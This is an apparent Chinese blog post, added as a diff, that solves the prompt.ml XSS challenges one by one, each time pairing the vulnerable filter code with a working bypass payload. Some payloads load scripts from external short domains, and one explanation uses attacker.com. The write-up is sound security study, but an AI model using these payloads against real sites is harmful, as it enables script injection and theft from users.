@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近搞了一下XSS，JavaScript和HTML里面的一些特性非常有趣。题目地址:http://prompt.ml/">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS(跨站脚本攻击)-Challenge">
+<meta property="og:url" content="http://yoursite.com/2018/04/22/xssChallenge/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="最近搞了一下XSS，JavaScript和HTML里面的一些特性非常有趣。题目地址:http://prompt.ml/">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/9.png">
+<meta property="og:updated_time" content="2018-04-21T21:30:43.890Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS(跨站脚本攻击)-Challenge">
+<meta name="twitter:description" content="最近搞了一下XSS，JavaScript和HTML里面的一些特性非常有趣。题目地址:http://prompt.ml/">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/10.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/04/22/xssChallenge/"/>
+
+
+
+
+
+  <title>XSS(跨站脚本攻击)-Challenge | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我等下就来</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/xssChallenge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS(跨站脚本攻击)-Challenge</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-04-22T03:56:10+08:00">
+                2018-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近搞了一下XSS，JavaScript和HTML里面的一些特性非常有趣。<br><strong>题目地址:<a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></strong><br><a id="more"></a></p>
+<h3 id="Challenge-0"><a href="#Challenge-0" class="headerlink" title="Challenge 0"></a>Challenge 0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>没有任何过滤。</p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">prompt(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只是过滤了个<code>&gt;</code></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">prompt(1)//</span></span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了<code>=(</code>，由于xml编码特性，在svg向量中的<code>&lt;script&gt;</code>元素，会先进行xml解析。因此<code>&amp;#x28</code>（十六进制）或者<code>&amp;#40</code>（十进制）或者<code>&amp;lpar;</code>（html实体编码）会被还原成<code>（</code>。</p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>(chrome必须闭合，firefox和IE可以不闭)</p>
+<h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了<code>-&gt;</code>，但是，可以用<code>--!&gt;</code></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;img src onerror=prompt(1)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>或是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;svg onload=prompt(1)&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这个题目是利用url的特性绕过，浏览器支持这样的url：<a href="http://user:password@attacker.com" target="_blank" rel="noopener">http://user:password@attacker.com</a> 。但是<a href="http://user:password/@attacker.com" target="_blank" rel="noopener">http://user:password/@attacker.com</a> 是不允许的。由于这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过，如下：<a href="http://prompt.ml%2f@attacker.com" target="_blank" rel="noopener">http://prompt.ml%2f@attacker.com</a> 。所以域名越短，答案就越短。</p>
+</blockquote>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//prompt.ml%2f@qq.com</span><br></pre></td></tr></table></figure></p>
+<p>这题有点迷，本地过不了。</p>
+<h3 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤掉了<code>&gt;</code>和<code>on*=</code>和<code>focus</code>，可以用换行来绕过。</p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=image src  onerror</span><br><span class="line">=&quot;prompt(1)</span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题用到了一个很经典的问题。<br><br>比如说，有一个<code>form</code>表单，<code>action=balabala</code>，但，如果<code>form</code>里面有个<code>input</code>的<code>name</code>也叫<code>action</code>，<code>name</code>获取这个<code>form</code>的<code>action</code>的时候，获取到的会是这个<code>input</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;  </span><br><span class="line">&lt;title&gt;Test&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;balabala&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;&quot; name=&quot;action&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;</span><br><span class="line">console.log(document.forms[0].action)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">　　&lt;/body&gt;   </span><br><span class="line">　　&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>结果会是<br><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/10.png" alt="image"></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:1&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-7"><a href="#Challenge-7" class="headerlink" title="Challenge 7"></a>Challenge 7</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用js的<code>/* */</code>注释符来解决。</p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">a</span>=<span class="string">'#'</span> <span class="attr">onload</span>=<span class="string">'/*#*/prompt(1)'</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这样，html source就变成<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">a</span>=<span class="string">"&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;p class="</span><span class="attr">comment</span>" <span class="attr">title</span>=<span class="string">""</span><span class="attr">onload</span>=<span class="string">'/*"&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;p class="comment" title="*/prompt(1)'</span>"&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以说非常优雅了</p>
+<h3 id="Challenge-8"><a href="#Challenge-8" class="headerlink" title="Challenge 8"></a>Challenge 8</h3><p>这题有点费解，关键是如何换行<br><br>过滤了换行、斜线、双引号、左尖括号<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>查了一下，<br></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prompt(<span class="number">1</span>)--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是如果直接手打<code>prompt(1) - -&gt;</code>是不行的，然后，如果按原样复制，markdown不支持，hexo会报错，不知为何。<br><br><strong>实在是很迷啊。</strong></p>
+<h3 id="Challenge-9"><a href="#Challenge-9" class="headerlink" title="Challenge 9"></a>Challenge 9</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先，正则表达式过滤了所有的tag，<code>toUpperCase()</code>是支持unicode函数的。<br>比如：字符ſ经过函数<code>toUpperCase()</code>处理后，会变成ASCII码字符”S”<br></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;</span><br></pre></td></tr></table></figure></p>
+<p>或者使用async<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript/async/src=//⒛₨&gt;</span><br></pre></td></tr></table></figure></p>
+<p>HTML的标签名和属性名并不区分大小写，async规定脚本将被异步执行。</p>
+<h3 id="Challenge-A"><a href="#Challenge-A" class="headerlink" title="Challenge A"></a>Challenge A</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题过滤了<code>prompt</code>和单引号，easy<br><br>(一开始还以为用了空格替换掉单引号(╯°□°）╯︵ ┻━┻)<br></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p<span class="string">'rompt(1)</span></span><br></pre></td></tr></table></figure></p>
